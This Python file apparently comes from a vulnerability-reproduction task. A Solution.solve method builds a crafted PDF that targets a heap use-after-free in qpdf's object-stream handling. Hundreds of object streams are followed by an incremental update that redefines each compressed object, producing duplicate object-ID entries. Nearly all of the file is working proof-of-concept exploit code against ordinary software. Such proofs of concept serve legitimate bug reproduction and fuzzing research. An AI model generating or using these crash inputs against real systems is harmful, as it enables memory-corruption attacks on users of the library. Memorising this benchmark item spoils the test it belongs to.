import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PDF that triggers the Heap Use After Free vulnerability
        # in QPDFWriter::preserveObjectStreams / QPDF::getCompressibleObjSet.
        # The vulnerability is triggered when there are multiple entries for the same object ID,
        # specifically involving object streams and incremental updates.
        
        data = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
        
        objects = {} # id -> offset
        xref_entries = {} # id -> (type, field2, field3)
        
        def add_obj(oid, content):
            off = len(data)
            data.extend(f"{oid} 0 obj\n".encode())
            data.extend(content)
            data.extend(b"\nendobj\n")
            objects[oid] = off
            xref_entries[oid] = (1, off, 0)
            return off

        # 1: Catalog
        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        
        # 2: Pages
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        
        # 3: Page
        add_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
        
        # Generate pairs of (ObjectStream, Object) to reach sufficient size (~33KB)
        # and create multiple definitions for objects.
        N = 200 
        base_id = 10
        
        for i in range(N):
            stm_id = base_id + 2*i
            obj_id = base_id + 2*i + 1
            
            # Object stream content: "id offset" pair then object data
            pair_str = f"{obj_id} 0\n"
            first_offset = len(pair_str)
            content_str = pair_str + "(X)"
            
            off = len(data)
            header = f"{stm_id} 0 obj\n<< /Type /ObjStm /N 1 /First {first_offset} /Length {len(content_str)} >>\nstream\n"
            data.extend(header.encode())
            data.extend(content_str.encode())
            data.extend(b"\nendstream\nendobj\n")
            
            objects[stm_id] = off
            xref_entries[stm_id] = (1, off, 0)
            xref_entries[obj_id] = (2, stm_id, 0) # Type 2 (Compressed), in stm_id, index 0
            
        # Write initial XRef Stream
        xref_id = base_id + 2*N
        max_id = xref_id
        
        stm_data = bytearray()
        
        # Entry 0: Free
        stm_data.extend(struct.pack('>B', 0) + struct.pack('>I', 0) + struct.pack('>H', 65535))
        
        # Add entries 1..max_id
        for i in range(1, max_id + 1):
            if i in xref_entries:
                t, f2, f3 = xref_entries[i]
            elif i == xref_id:
                t, f2, f3 = (1, 0, 0) # Placeholder for self (offset unknown yet)
            else:
                t, f2, f3 = (0, 0, 0)
            stm_data.extend(struct.pack('>B', t) + struct.pack('>I', f2) + struct.pack('>H', f3))
            
        xr_off = len(data)
        
        # Fixup self-reference offset in the stream data
        # Each entry is 1+4+2 = 7 bytes
        self_entry_offset = xref_id * 7
        stm_data[self_entry_offset : self_entry_offset+7] = \
            struct.pack('>B', 1) + struct.pack('>I', xr_off) + struct.pack('>H', 0)
            
        header = f"{xref_id} 0 obj\n<< /Type /XRef /Size {max_id+1} /W [1 4 2] /Root 1 0 R /Length {len(stm_data)} >>\nstream\n"
        data.extend(header.encode())
        data.extend(stm_data)
        data.extend(b"\nendstream\nendobj\n")
        
        data.extend(f"startxref\n{xr_off}\n%%EOF\n".encode())
        
        # Incremental Update
        # Redefine all 'inside' objects (odd IDs) as regular objects.
        # This creates the "multiple entries for the same object id" condition:
        # 1. Defined as compressed in the base XRef Stream.
        # 2. Defined as uncompressed in the update XRef Table.
        
        new_offsets = {}
        for i in range(N):
            obj_id = base_id + 2*i + 1
            off = len(data)
            data.extend(f"{obj_id} 0 obj\n(Updated)\nendobj\n".encode())
            new_offsets[obj_id] = off
            
        xref_table_off = len(data)
        data.extend(b"xref\n")
        data.extend(b"0 1\n0000000000 65535 f \n")
        
        # Use multiple subsections for the non-contiguous IDs
        for i in range(N):
            obj_id = base_id + 2*i + 1
            data.extend(f"{obj_id} 1\n{new_offsets[obj_id]:010d} 00000 n \n".encode())
            
        data.extend(f"trailer\n<< /Size {max_id+1} /Root 1 0 R /Prev {xr_off} >>\n".encode())
        data.extend(f"startxref\n{xref_table_off}\n%%EOF\n".encode())
        
        return bytes(data)